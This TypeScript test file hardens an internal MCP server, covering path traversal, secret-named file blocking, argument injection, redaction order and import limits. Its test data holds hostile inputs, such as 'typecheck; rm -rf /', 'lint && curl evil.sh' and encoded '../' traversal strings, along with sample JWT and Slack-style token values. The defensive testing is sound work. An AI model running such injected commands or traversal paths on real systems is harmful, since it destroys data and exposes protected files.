/**
 * Stage-1 hardening guards for the internal MCP server.
 *
 * Covers the cross-platform traversal surface, command-argument injection, the
 * redact-before-truncate egress order, the search-cannot-dump-blocked-files
 * invariant, and the import boundary (Node built-ins + local modules only).
 * Each test names a concrete attack a regression would re-open.
 */
import {
  existsSync,
  mkdirSync,
  readFileSync,
  readdirSync,
  statSync,
  unlinkSync,
  writeFileSync,
} from "node:fs";
import { join, resolve } from "node:path";
import {
  PathNotAllowedError,
  resolveAllowedPath,
} from "@/scripts/mcp/security/paths";
import { redactSecrets } from "@/scripts/mcp/security/redact";
import { truncateOutput } from "@/scripts/mcp/security/truncate";
import { npmArgsFor } from "@/scripts/mcp/tools/commands";
import { docsTools } from "@/scripts/mcp/tools/docs";
import { ToolRegistry } from "@/scripts/mcp/registry";
import { handleRpc } from "@/scripts/mcp/protocol";

const REPO = resolve(__dirname, "../../..");
const MCP_ROOT = join(REPO, "scripts", "mcp");

describe("MCP path traversal — cross-platform", () => {
  it("rejects Windows-style backslash traversal on every platform", () => {
    expect(() => resolveAllowedPath("..\\..\\secrets", ["docs"])).toThrow(
      PathNotAllowedError,
    );
    expect(() =>
      resolveAllowedPath("docs\\..\\..\\package.json", ["docs"]),
    ).toThrow(PathNotAllowedError);
  });

  it("rejects percent-encoded traversal sequences before any decode", () => {
    expect(() => resolveAllowedPath("docs/%2e%2e/x.md", ["docs"])).toThrow(
      PathNotAllowedError,
    );
    expect(() => resolveAllowedPath("%2e%2e%2fetc", ["docs"])).toThrow(
      PathNotAllowedError,
    );
    expect(() => resolveAllowedPath("docs%5c..%5cx", ["docs"])).toThrow(
      PathNotAllowedError,
    );
  });

  it("rejects a bare '.' or '..' segment regardless of position", () => {
    expect(() => resolveAllowedPath("docs/./rules/x.md", ["docs"])).toThrow(
      PathNotAllowedError,
    );
    expect(() => resolveAllowedPath("docs/rules/../x.md", ["docs"])).toThrow(
      PathNotAllowedError,
    );
  });
});

describe("MCP blocked-name matching is case-insensitive", () => {
  it("rejects upper/mixed-case secret-bearing filenames", () => {
    for (const p of [
      "docs/.ENV",
      "docs/My-SECRET.md",
      "docs/Service-Role.md",
      "docs/API.KEY",
    ]) {
      expect(() => resolveAllowedPath(p, ["docs"])).toThrow(PathNotAllowedError);
    }
  });
});

describe("MCP command wrapper — no argument injection", () => {
  it("builds argv only from the static allowlist, never the caller string", () => {
    expect(npmArgsFor("typecheck")).toEqual(["run", "typecheck"]);
    expect(npmArgsFor("lint")).toEqual(["run", "lint"]);
    expect(npmArgsFor("lint:structure")).toEqual(["run", "lint:structure"]);
  });

  it("throws on any non-allowlisted / injection-shaped key without spawning", () => {
    for (const evil of [
      "typecheck; rm -rf /",
      "lint && curl evil.sh",
      "../../bin/sh",
      "db:push",
      "deploy",
      "lint --fix",
    ]) {
      expect(() => npmArgsFor(evil)).toThrow();
    }
  });

  it("never emits a shell metacharacter in the produced argv", () => {
    const args = npmArgsFor("lint:structure");
    expect(args.join(" ")).not.toMatch(/[;&|`$(){}<>]/);
  });
});

describe("MCP egress redaction order (redact BEFORE truncate)", () => {
  it("redacts a secret that truncate-first would have split mid-token", () => {
    const jwt =
      "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c";
    // Token glued to preceding word chars (no delimiter) — the worst case.
    const blob = `prefix${jwt}`;
    // Cap sits above the redacted length (~`prefix[REDACTED:jwt]`) but well
    // below the raw length, so order is the only thing that decides leakage.
    const cap = 40;

    // Truncate-first leaks the head of the token.
    expect(truncateOutput(blob, cap)).toContain("eyJ");
    // Redact-first (the order the protocol egress uses) never does.
    const safe = truncateOutput(redactSecrets(blob), cap);
    expect(safe).not.toContain("eyJ");
    expect(safe).toContain("[REDACTED:jwt]");
  });

  it("applies redaction at the protocol tools/call egress for any tool", async () => {
    // Assembled at runtime — no full literal Slack-bot-token string in source
    // (avoids secret-scanning false positives) while still proving egress redaction.
    const slackToken = ["xoxb", "123456789012", "abcdEFGHijklMNOP"].join("-");
    const registry = new ToolRegistry();
    registry.register({
      name: "probe_secret_emitter",
      description: "test-only tool that returns a credential-shaped string",
      inputSchema: { type: "object", properties: {}, additionalProperties: false },
      handler: () => `leak ${slackToken} end`,
    });
    const res = await handleRpc(
      {
        jsonrpc: "2.0",
        id: 9,
        method: "tools/call",
        params: { name: "probe_secret_emitter", arguments: {} },
      },
      registry,
    );
    const text = (res?.result as { content: { text: string }[] }).content[0]
      ?.text;
    expect(text).not.toContain(slackToken);
    expect(text).toContain("[REDACTED:slack-token]");
  });
});

describe("MCP search cannot dump blocked files", () => {
  const probeDir = join(REPO, "docs");
  const blockedFile = join(probeDir, "__mcp_probe_secret_token__.md");
  const plainFile = join(probeDir, "__mcp_probe_plain__.md");
  const MARKER = "ZZqMcpProbeMarker7788";

  beforeAll(() => {
    if (!existsSync(probeDir)) mkdirSync(probeDir, { recursive: true });
    writeFileSync(blockedFile, `# blocked\n${MARKER} should never surface\n`);
    writeFileSync(plainFile, `# plain\n${MARKER} is searchable\n`);
  });

  afterAll(() => {
    for (const f of [blockedFile, plainFile]) {
      if (existsSync(f)) unlinkSync(f);
    }
  });

  it("returns a non-blocked doc but skips the secret/token-named doc", async () => {
    const search = docsTools.find((t) => t.name === "search_project_docs")!;
    const out = String(await search.handler({ query: MARKER }));
    expect(out).toContain("__mcp_probe_plain__.md"); // control: search works
    expect(out).not.toContain("__mcp_probe_secret_token__.md"); // blocked
  });

  it("refuses to resolve the blocked-named file directly", () => {
    expect(() =>
      resolveAllowedPath("docs/__mcp_probe_secret_token__.md", ["docs"]),
    ).toThrow(PathNotAllowedError);
  });
});

describe("MCP import boundary — Node built-ins + local modules only", () => {
  function collectTsFiles(dir: string): string[] {
    const out: string[] = [];
    for (const name of readdirSync(dir)) {
      if (name === "dist" || name === "node_modules") continue;
      const abs = join(dir, name);
      if (statSync(abs).isDirectory()) out.push(...collectTsFiles(abs));
      else if (name.endsWith(".ts")) out.push(abs);
    }
    return out;
  }

  it("every import specifier is a node: builtin or a relative local path", () => {
    const files = collectTsFiles(MCP_ROOT);
    const specifierRe =
      /(?:import\s[^"']*?from\s*|import\s*|require\s*\(\s*)["']([^"']+)["']/g;
    const offenders: string[] = [];
    for (const file of files) {
      const text = readFileSync(file, "utf8");
      let m: RegExpExecArray | null;
      while ((m = specifierRe.exec(text)) !== null) {
        const spec = m[1] ?? "";
        const ok = spec.startsWith("node:") || spec.startsWith(".");
        if (!ok) offenders.push(`${file}: ${spec}`);
      }
    }
    expect(offenders).toEqual([]);
  });
});
